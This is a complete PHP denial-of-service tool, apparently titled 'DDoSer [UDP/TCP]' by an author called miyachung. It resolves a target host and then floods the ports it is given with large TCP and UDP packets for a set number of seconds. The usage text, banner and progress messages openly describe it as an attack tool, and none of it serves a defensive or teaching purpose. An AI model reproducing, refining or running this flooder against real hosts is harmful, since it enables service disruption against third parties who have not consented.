<?php
/*
          .__                      .__                          
    _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
   /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
  |  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
  |__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
        \/    \/          \/     \/     \/           \//_____/  
      .___  .___                         
    __| _/__| _/____  ______ ___________ 
   / __ |/ __ |/  _ \/  ___// __ \_  __ \
  / /_/ / /_/ (  <_> )___ \\  ___/|  | \/
  \____ \____ |\____/____  >\___  >__|   


    @ DDoSer [UDP/TCP]
    @ by miyachung

       Usage
       -h TARGET_HOST -p PORT(S) -t TIME_TO_ATTACK [DEFAULT 60 seconds]
       --host TARGET_HOST --ports PORT(S) --time TIME_TO_ATTACK [DEFAULT 60 seconds]
       You can give multiple ports by adding ','
*/
error_reporting(E_ALL ^ E_NOTICE);

$options     = getopt("h:p:t:",["host:","ports:","time:"]);

$arguments   = options_prepare($options);

// -------------------------------------------
$host        = $arguments[0];
$ports       = $arguments[1];
$time        = $arguments[2];
// -------------------------------------------

$prefix = greet_message();


$ip_check    = ipgrab_and_control($host);

if(! $ip_check){
    die($prefix." Can not resolve the host [$host]");
}

// ------------------------------------------------------------------------------------------
print $prefix."[+] Resolved host: $host [$ip_check]".PHP_EOL;
print $prefix.'[+] Port(s) to attack: '.implode(',',$ports).PHP_EOL;
print $prefix.'[+] Attack time: '.$time.' seconds'.PHP_EOL;
// ------------------------------------------------------------------------------------------
print "--------------------------------------------------------------------------".PHP_EOL;
print $prefix.' Creating a packet with size 65000..'.PHP_EOL;
$packet = create_packet();
sleep(1);
print $prefix.' Packet created!'.PHP_EOL;
print $prefix.' Setting the timer for attack..'.PHP_EOL;
sleep(1);
$runtime = ( time() + $time );
print $prefix.' Done!'.PHP_EOL;
print "--------------------------------------------------------------------------".PHP_EOL;
// ------------------------------------------------------------------------------------------



while(time() < $runtime){

    foreach($ports as $p){
        send_packet( $host , $p , $packet , $prefix );
    }

}

print $prefix.' Time is over!'.PHP_EOL;
print $prefix.' Attack has been stopped'.PHP_EOL;
print $prefix.' Miyachung greets you :)';

// ------------------------------------------------------------------------------------------


function ipgrab_and_control($host){

    $getip = gethostbyname($host);

    if(preg_match('/([0-9]{1,4})\.([0-9]{1,4})\.([0-9]{1,4})\.([0-9]{1,4})/',$getip)){
        return $getip;
    }else{
        return false;
    }

}

function options_prepare($options){

    // Prepare option -h --host
    if(isset($options['h'])){
        $target = $options['h'];
    }elseif(isset($options['host'])){
        $target = $options['host'];
    }else{
        print_usage();
        die(PHP_EOL."\tPlease give host to attack!");
    }
    // Prepare option -p --ports
    if(isset($options['p'])){
        $ports = $options['p'];
    }elseif(isset($options['ports'])){
        $ports = $options['ports'];
    }else{
        print_usage();
        die(PHP_EOL."\tPlease give port(s) to attack!");
    }
    // Prepare option -t --time
    if(isset($options['t'])){
        $time = $options['t'];
    }elseif(isset($options['time'])){
        $time = $options['time'];
    }else{
        $time = 60;
    }


    $target  = str_replace("http://","",$target);
    $target  = str_replace("https://","",$target);
    $target  = str_replace("/","",$target);

    $ports   = explode(",",$ports);

    return [$target,$ports,$time];
}

function print_usage(){

       print banner();
       print PHP_EOL.PHP_EOL;
       print "\tUsage  ".PHP_EOL;
       print "\t{$_SERVER['PHP_SELF']} -h TARGET_HOST -p PORT(S) -t TIME_TO_ATTACK [DEFAULT 60 seconds]".PHP_EOL;
       print "\t{$_SERVER['PHP_SELF']} --host TARGET_HOST --ports PORT(S) --time TIME_TO_ATTACK [DEFAULT 60 seconds]".PHP_EOL;
       print "\tYou can give multiple ports by adding ',' ";
       print PHP_EOL;
}
function banner(){
    $banner = "
          .__                      .__                          
    _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
   /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
  |  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
  |__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
        \/    \/          \/     \/     \/           \//_____/  
      .___  .___                         
    __| _/__| _/____  ______ ___________ 
   / __ |/ __ |/  _ \/  ___// __ \_  __ \
  / /_/ / /_/ (  <_> )___ \\  ___/|  | \/
  \____ \____ |\____/____  >\___  >__|    ";
                                                                  
                                                                  
       return $banner;
}
function greet_message(){
    $proc_id = getmypid();
    $prefix = "[INFO][PROC-$proc_id]";
    print banner();
    print PHP_EOL.PHP_EOL;
    print $prefix.' You are now using miyachung\'s ddoser..'.PHP_EOL;
    print $prefix.' Miyachung greets you :)'.PHP_EOL;
    for($i = 0; $i < rand(1,2); $i++){
        print ".";
    }
    print PHP_EOL.PHP_EOL;
    sleep($i);
    return $prefix;
}
function create_packet($size=65000){
    $str  = '\x00';
    return str_repeat($str,$size);
}
function send_packet($host,$port,$packet,$prefix){
    print $prefix.'[~] Sending packet via udp|tcp , port '.$port.PHP_EOL;
    // --- Send TCP
    $socket = @fsockopen('tcp://'.$host,$port,$errno,$errstr,10);
    if($socket){
        fwrite($socket,$packet);
    }else{
        print $prefix.'[TCP][PORT: '.$port.'] '.$errstr;
    }
    @fclose($socket);
    // --- Send UDP
    $socket = @fsockopen('udp://'.$host,$port,$errno,$errstr,10);

    if($socket){
        fwrite($socket,$packet);
    }else{
        print $prefix.'[UDP][PORT: '.$port.'] '.$errstr;
    }
    @fclose($socket);
    print $prefix.'[+] Packet has sent!'.PHP_EOL;
}
